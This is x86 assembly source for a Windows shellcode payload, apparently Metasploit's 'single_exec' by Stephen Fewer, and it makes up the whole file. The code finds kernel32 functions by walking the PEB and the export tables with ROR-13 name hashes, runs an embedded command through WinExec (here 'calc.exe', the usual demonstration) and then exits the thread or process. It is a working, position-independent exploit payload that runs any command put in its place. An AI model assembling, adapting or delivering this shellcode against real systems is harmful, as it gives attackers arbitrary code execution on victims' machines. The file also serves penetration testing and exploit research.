;-----------------------------------------------------------------------------;
; Author: Stephen Fewer (stephen_fewer[at]harmonysecurity[dot]com)
; Compatible: Windows 7, 2008, Vista, 2003, XP, 2000, NT4
; Version: 1.0 (28 July 2009)
; Size: 191 bytes + strlen(command) + 1
; Build: >build.py single_exec
;-----------------------------------------------------------------------------;

[BITS 32]

  cld                    ; Clear the direction flag.
  call start             ; Call start, this pushes the address of 'api_call' onto the stack.
delta:                   ;

api_call:
  pushad                 ; We preserve all the registers for the caller, bar EAX and ECX.
  mov ebp, esp           ; Create a new stack frame
  xor eax, eax           ; Zero EAX (upper 3 bytes will remain zero until function is found)
  mov edx, [fs:eax+48]   ; Get a pointer to the PEB
  mov edx, [edx+12]      ; Get PEB->Ldr
  mov edx, [edx+20]      ; Get the first module from the InMemoryOrder module list
next_mod:                ;
  mov esi, [edx+40]      ; Get pointer to modules name (unicode string)
  movzx ecx, word [edx+38] ; Set ECX to the length we want to check
  xor edi, edi           ; Clear EDI which will store the hash of the module name
loop_modname:            ;
  lodsb                  ; Read in the next byte of the name
  cmp al, 'a'            ; Some versions of Windows use lower case module names
  jl not_lowercase       ;
  sub al, 0x20           ; If so normalise to uppercase
not_lowercase:           ;
  ror edi, 13            ; Rotate right our hash value
  add edi, eax           ; Add the next byte of the name
  loop loop_modname      ; Loop until we have read enough

  ; We now have the module hash computed
  push edx               ; Save the current position in the module list for later
  push edi               ; Save the current module hash for later
  ; Proceed to iterate the export address table,
  mov edx, [edx+16]      ; Get this modules base address
  mov ecx, [edx+60]      ; Get PE header

  ; use ecx as our EAT pointer here so we can take advantage of jecxz.
  mov ecx, [ecx+edx+120] ; Get the EAT from the PE header
  jecxz get_next_mod1    ; If no EAT present, process the next module
  add ecx, edx           ; Add the modules base address
  push ecx               ; Save the current modules EAT
  mov ebx, [ecx+32]      ; Get the rva of the function names
  add ebx, edx           ; Add the modules base address
  mov ecx, [ecx+24]      ; Get the number of function names
  ; now ecx returns to its regularly scheduled counter duties

  ; Computing the module hash + function hash
get_next_func:           ;
  jecxz get_next_mod     ; When we reach the start of the EAT (we search backwards), process the next module
  dec ecx                ; Decrement the function name counter
  mov esi, [ebx+ecx*4]   ; Get rva of next module name
  add esi, edx           ; Add the modules base address
  xor edi, edi           ; Clear EDI which will store the hash of the function name
  ; And compare it to the one we want
loop_funcname:           ;
  lodsb                  ; Read in the next byte of the ASCII function name
  ror edi, 13            ; Rotate right our hash value
  add edi, eax           ; Add the next byte of the name
  cmp al, ah             ; Compare AL (the next byte from the name) to AH (null)
  jne loop_funcname      ; If we have not reached the null terminator, continue
  add edi, [ebp-8]       ; Add the current module hash to the function hash
  cmp edi, [ebp+36]      ; Compare the hash to the one we are searching for
  jnz get_next_func      ; Go compute the next function hash if we have not found it

  ; If found, fix up stack, call the function and then value else compute the next one...
  pop eax                ; Restore the current modules EAT
  mov ebx, [eax+36]      ; Get the ordinal table rva
  add ebx, edx           ; Add the modules base address
  mov cx, [ebx+2*ecx]    ; Get the desired functions ordinal
  mov ebx, [eax+28]      ; Get the function addresses table rva
  add ebx, edx           ; Add the modules base address
  mov eax, [ebx+4*ecx]   ; Get the desired functions RVA
  add eax, edx           ; Add the modules base address to get the functions actual VA
  ; We now fix up the stack and perform the call to the desired function...
finish:
  mov [esp+36], eax      ; Overwrite the old EAX value with the desired api address for the upcoming popad
  pop ebx                ; Clear off the current modules hash
  pop ebx                ; Clear off the current position in the module list
  popad                  ; Restore all of the callers registers, bar EAX, ECX and EDX which are clobbered
  pop ecx                ; Pop off the origional return address our caller will have pushed
  pop edx                ; Pop off the hash value our caller will have pushed
  push ecx               ; Push back the correct return value
  jmp eax                ; Jump into the required function
  ; We now automagically return to the correct caller...

get_next_mod:            ;
  pop edi                ; Pop off the current (now the previous) modules EAT
get_next_mod1:           ;
  pop edi                ; Pop off the current (now the previous) modules hash
  pop edx                ; Restore our position in the module list
  mov edx, [edx]         ; Get the next module
  jmp short next_mod     ; Process this module

start:                   ;
  pop ebp                ; Pop off the address of 'api_call' for calling later.
  push byte +1           ;
  lea eax, [ebp+command-delta]
  push eax               ;
  push 0x876F8B31        ; hash( "kernel32.dll", "WinExec" )
  call ebp               ; WinExec( &command, 1 );
	; Finish up with the EXITFUNK.

exitfunk:
  mov ebx, 0x0A2A1DE0    ; The EXITFUNK as specified by user...
  push 0x9DBD95A6        ; hash( "kernel32.dll", "GetVersion" )
  call ebp               ; GetVersion(); (AL will = major version and AH will = minor version)
  cmp al, byte 6         ; If we are not running on Windows Vista, 2008 or 7
  jl short goodbye       ; Then just call the exit function...
  cmp bl, 0xE0           ; If we are trying a call to kernel32.dll!ExitThread on Windows Vista, 2008 or 7...
  jne short goodbye      ;
  mov ebx, 0x6F721347    ; Then we substitute the EXITFUNK to that of ntdll.dll!RtlExitUserThread
goodbye:                 ; We now perform the actual call to the exit function
  push byte 0            ; push the exit function parameter
  push ebx               ; push the hash of the exit function
  call ebp               ; call EXITFUNK( 0 );

command:
  db "calc.exe", 0

